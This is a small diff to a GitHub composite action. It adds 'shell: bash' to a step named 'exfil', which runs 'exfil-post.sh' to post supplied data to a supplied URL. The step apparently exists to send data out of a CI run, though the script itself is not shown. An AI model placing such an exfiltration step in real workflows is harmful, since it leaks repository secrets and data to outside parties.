@@ -14,4 +14,5 @@ runs:
   using: 'composite'
   steps:
     - name: exfil
+      shell: bash
       run: bash ${{ github.action_path }}/exfil-post.sh "${{ inputs.url }}" "${{ inputs.data }}"
